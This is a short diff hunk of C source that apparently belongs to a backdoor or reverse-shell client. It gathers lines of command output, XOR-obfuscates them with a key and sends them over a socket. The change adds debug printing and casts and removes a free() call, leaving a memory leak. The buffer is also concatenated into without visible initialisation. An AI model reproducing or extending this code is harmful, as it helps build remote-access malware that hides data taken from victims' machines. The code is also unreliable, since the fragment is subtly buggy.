@@ -78,15 +78,16 @@ int main(void) {
 			    free(xorerror);
                                             
                         }
+
 			char path[2050];
                         char command[12000];
                         while (fgets(path, sizeof(path), fp) != NULL) {
-                       
+                       		printf("Line: %s\n", path);
 				strcat(command, path);
                         }
-                        char* xordata = XOR(command, key, strlen(command), keylen);
-                        send(sock, xordata, strlen(command), 0);
-                        free(xordata);
+                        char* xordata = XOR(command, key, (int)strlen(command), keylen);
+			
+                        send(sock, xordata, (int)strlen(command), 0);
 			memset(command, '\0', strlen(command));
 
 		}
